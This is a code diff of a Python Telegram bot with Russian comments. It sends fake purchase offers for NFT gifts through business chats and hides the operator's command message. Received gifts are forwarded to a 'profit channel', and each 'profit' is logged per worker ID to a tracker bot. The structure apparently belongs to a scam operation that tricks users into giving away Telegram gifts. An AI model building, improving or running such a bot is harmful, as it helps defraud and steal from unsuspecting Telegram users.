@@ -91,7 +91,7 @@ def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
 
 def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
-    # Ссылка ведет на профиль (карточку) пользователя
+    # Ссылка открывает карточку профиля получателя
     profile_url = f"tg://resolve?domain={TARGET_USERNAME}&profile"
     
     return InlineKeyboardMarkup(
@@ -120,16 +120,19 @@ async def cmd_offer_business(message: Message):
     cur_key = parts[3].lower()
     lang = parts[4].lower()
 
-    # Автоматически добавляем https:// если пользователь забыл
-    if not url.startswith("http"):
+    # --- ИСПРАВЛЕНИЕ ССЫЛКИ (автозамена http на https) ---
+    if url.startswith("http://"):
+        url = url.replace("http://", "https://", 1)
+    elif not url.startswith("http"):
         url = "https://" + url
+    # ---------------------------------------------------
 
     if lang not in TEXTS:
         lang = "ru"
 
-    # Проверяем, что ссылка ведет на NFT
+    # Строгая проверка, что это ссылка на NFT
     if not url.startswith("https://t.me/nft/"):
-        return await message.answer("Ошибка: ссылка должна вести на NFT-подарок.")
+        return await message.answer("Ошибка: ссылка должна вести на NFT-подарок (начинаться с https://t.me/nft/).")
     if cur_key not in CURRENCY:
         return await message.answer("Валюта только g или s.")
     if not raw_sum.isdigit() or int(raw_sum) <= 0:
@@ -164,6 +167,7 @@ async def cmd_offer_business(message: Message):
         name=gift_name
     ) + f"\n\n{url}"
 
+    # Удаляем сообщение с командой
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -172,6 +176,7 @@ async def cmd_offer_business(message: Message):
     except Exception as e:
         logging.error(f"Delete error: {e}")
 
+    # Отправляем оффер с превью
     try:
         await bot.send_message(
             chat_id=message.chat.id,
@@ -225,7 +230,7 @@ async def on_accept(call: CallbackQuery):
             logging.error(f"Retry edit error: {error}")
     except TelegramBadRequest as e:
         if "message is not modified" in str(e):
-            pass
+            pass # Игнорируем ошибку, если пользователь нажал кнопку дважды
         else:
             logging.error(f"Edit error: {e}")
     except Exception as e:
@@ -257,7 +262,7 @@ async def on_decline(call: CallbackQuery):
     await call.answer()
 
 # =====================================
-# ПОЛУЧЕНИЕ ПОДАРКА
+# ПОЛУЧЕНИЕ ПОДАРКА (АВТОМАТИЗАЦИЯ)
 # =====================================
 @dp.business_message(F.gift)
 async def handle_gift(message: Message):
@@ -275,6 +280,7 @@ async def handle_gift(message: Message):
     base_name = getattr(gift, "base_name", "") or ""
     gift_id = getattr(gift, "id", "")
 
+    # Пересылаем подарок в канал профитов
     try:
         await bot.forward_message(
             chat_id=PROFIT_CHANNEL_ID,
@@ -285,6 +291,7 @@ async def handle_gift(message: Message):
     except Exception as e:
         logging.error(f"Forward error: {e}")
 
+    # Отправляем данные Трекер-боту
     tracker_text = f"/add_profit {worker_id} {stars} {base_name} {gift_id}"
     tracker_url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
 
